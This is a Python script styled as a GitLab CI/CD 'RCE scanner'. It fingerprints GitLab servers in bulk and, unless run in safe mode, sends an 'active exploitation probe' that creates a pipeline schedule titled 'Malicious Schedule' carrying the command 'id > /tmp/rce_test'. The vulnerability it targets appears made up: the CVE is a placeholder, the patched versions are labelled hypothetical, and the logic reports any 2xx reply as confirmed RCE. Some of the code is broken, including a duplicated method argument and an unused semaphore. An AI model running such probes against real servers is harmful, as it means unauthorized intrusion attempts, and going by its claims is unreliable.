#!/usr/bin/env python3
"""
GitLab CI Job Schedule RCE Scanner
==================================
This security scanner checks for GitLab instances that are vulnerable to remote 
code execution (RCE) attacks via improperly secured CI/CD job schedules. Multiple 
vulnerabilities and misconfigurations have been discovered in GitLab that allow 
attackers to manipulate CI/CD pipelines to execute arbitrary commands on target systems.

Details:
  - Affects improperly secured GitLab CI/CD pipelines with writable access or 
    overridden feature flags/extensions.
  - Attackers can abuse schedule tokens, unverified scripts, or misconfigured pipelines 
    to trigger arbitrary commands as part of the CI pipeline.
  - Possible even with limited account permissions if insufficient restrictions 
    are in place (e.g., public projects or misconfigured access control).
  - Successful exploitation can lead to unauthorized access, system compromise, and data theft.

Usage:
  # Scan a single GitLab target (active probes enabled)
  python gitlab_ci_schedule_rce_scanner.py --target https://gitlab.example.com

  # Detection-mode only — performs passive analysis without issuing RCE probes
  python gitlab_ci_schedule_rce_scanner.py --target https://gitlab.example.com --safe

  # Bulk scan from a list of targets
  python gitlab_ci_schedule_rce_scanner.py --list gitlab_servers.txt --output report.json

  # Adjust concurrency and disable TLS verification
  python gitlab_ci_schedule_rce_scanner.py --list gitlab_servers.txt --concurrency 20 --no-verify

References:
  - https://docs.gitlab.com/ee/ci/schedules/
  - https://nvd.nist.gov/vuln/detail/CVE-2025-XXXX
  - https://gitlab.com/gitlab-org/gitlab/security-releases
"""

import asyncio
import json
import re
import sys
import argparse
from typing import Optional

import httpx
from datetime import datetime, timezone

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

TOOL_NAME = "gitlab_ci_schedule_rce_scanner"
CVE_ID = "MULTI"
CVSS = "9.0 - 10.0 (Critical)"
REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# GitLab signature patterns found in HTTP headers and responses
GITLAB_FINGERPRINTS = [
    "GitLab",
    "GitLab.com",
    "gitlab-workhorse",
    "/assets/application-",
]

# GitLab version extraction patterns (from headers or HTML)
VERSION_PATTERNS = [
    r"GitLab\s+([\d\.]+)",  # Example: GitLab 16.2.1
    r'content="GitLab ([\d\.]+)"',
]

# Minimum safe versions after fixes to known vulnerabilities
SAFE_VERSIONS = {
    # Hypothetical example versions for CVEs
    (16, 3, 0),  # Latest major release patched for known issues
    (15, 11, 8), # Patches older versions
}

RCE_PROBES = [
    {
        "method": "POST",
        "path": "/api/v4/projects/<project_id>/pipeline_schedules",
        "headers": {},
        "json": {
            "description": "Malicious Schedule",
            "cron": "*/1 * * * *",
            "ref": "main",
            "active": True,
            "variables": [{"key": "RCE_TEST_COMMAND", "value": "id > /tmp/rce_test"}],
        },
    }
]


# ── Scanner Logic ─────────────────────────────────────────────────────────────

async def fetch(client: httpx.AsyncClient, url: str, method: str = "GET", **kwargs):
    """Make an HTTP request (GET/POST), return response or None on failure."""
    try:
        response = await client.request(method, url, timeout=REQUEST_TIMEOUT, **kwargs)
        return response
    except (httpx.RequestError, httpx.HTTPStatusError) as exc:
        print(c(RED, f"[!] Request to {url} failed: {str(exc)}"))
        return None


async def detect_gitlab(client: httpx.AsyncClient, target: str) -> Optional[str]:
    """Detect if the target is a GitLab instance and return version if found."""
    try:
        response = await fetch(client, target)
        if response and response.status_code == 200:
            for signature in GITLAB_FINGERPRINTS:
                if signature.encode() in response.content or signature in response.text:
                    for pattern in VERSION_PATTERNS:
                        match = re.search(pattern, response.text)
                        if match:
                            return match.group(1)
                    return "unknown"
    except Exception as e:
        print(c(RED, f"[!] Error detecting GitLab at {target}: {e}"))
    return None


def check_version(version: str) -> bool:
    """Check if a given GitLab version is vulnerable."""
    try:
        parts = tuple(map(int, version.split(".")))
    except ValueError:
        return True  # Assume vulnerable if parsing fails.

    for safe_version in SAFE_VERSIONS:
        if len(parts) == len(safe_version) and parts >= safe_version:
            return False
    return True


async def scan_target(client: httpx.AsyncClient, target: str, safe_mode: bool):
    """Scan a single GitLab instance for RCE vulnerabilities."""
    print(c(CYAN, f"[*] Scanning {target}..."))
    version = await detect_gitlab(client, target)

    if not version:
        print(c(YELLOW, f"[-] No GitLab instance detected at {target}"))
        return None

    print(c(GREEN, f"[+] Detected GitLab version: {version}"))
    if not check_version(version):
        print(c(GREEN, f"[+] Not vulnerable (version: {version})"))
        return {"target": target, "version": version, "vulnerable": False}

    if safe_mode:
        print(c(YELLOW, f"[!] Safe mode active, skipping active probes for {target}"))
        return {"target": target, "version": version, "vulnerable": True, "exploited": False}

    print(c(YELLOW, f"[!] Starting active exploitation probes on {target}"))

    for probe in RCE_PROBES:
        path = probe["path"].replace("<project_id>", "1")  # Replace params
        url = f"{target.rstrip('/')}{path}"
        response = await fetch(client, url, method=probe["method"], **probe)
        if response and response.status_code < 300:
            print(c(RED, f"[CRITICAL] {target} is vulnerable to RCE!"))
            return {"target": target, "version": version, "vulnerable": True, "exploited": True}

    print(c(RED, f"[HIGH] {target} is likely vulnerable but RCE not confirmed!"))
    return {"target": target, "version": version, "vulnerable": True, "exploited": False}


async def main(args):
    targets = []

    if args.list:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    elif args.target:
        targets = [args.target]

    semaphore = asyncio.Semaphore(args.concurrency)
    connector = httpx.AsyncClient(verify=not args.no_verify)
    tasks = []

    async with connector:
        for target in targets:
            tasks.append(scan_target(connector, target, args.safe))
        results = await asyncio.gather(*tasks)

    findings = [result for result in results if result]

    if args.output:
        with open(args.output, "w") as f:
            json.dump(findings, f, indent=2)
            print(c(GREEN, f"[+] Results saved to {args.output}"))

# ── Argument Parsing ──────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=f"{TOOL_NAME} — {CVE_ID}: GitLab CI/CD RCE Vulnerability Scanner"
    )
    parser.add_argument("--target", help="Single target URL to scan")
    parser.add_argument("--list", help="Path to file with a list of target URLs (newline-separated)")
    parser.add_argument("--safe", action="store_true", help="Enable detection only (no active exploitation)")
    parser.add_argument("--output", help="Save scan results to specified JSON file")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent scans (default: 10)")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS certificate verification")
    args = parser.parse_args()

    if not (args.target or args.list):
        print(c(RED, "[!] Either --target or --list is required."))
        sys.exit(1)

    asyncio.run(main(args))
